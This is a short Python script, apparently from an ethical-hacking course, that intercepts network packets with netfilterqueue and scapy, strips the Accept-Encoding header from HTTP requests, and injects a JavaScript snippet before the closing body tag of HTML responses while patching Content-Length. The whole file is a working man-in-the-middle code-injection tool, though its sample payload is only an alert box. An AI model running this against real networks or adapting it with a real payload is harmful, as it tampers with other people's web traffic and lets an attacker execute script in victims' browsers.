#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

def set_packet(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def main_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        load = load.replace("HTTP/1.1","HTTP/1.0")
        if scapy_packet[scapy.TCP].dport == 10000:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 10000:
            injection_code = "<script>alert('You Have Been Hacked');</script>"
            print("[+] Response")
            # print(scapy_packet.show())
            load = load.replace("</body>", injection_code +"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_load = set_packet(scapy_packet, load)
            packet.set_payload(str(new_load))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, main_process)
queue.run()
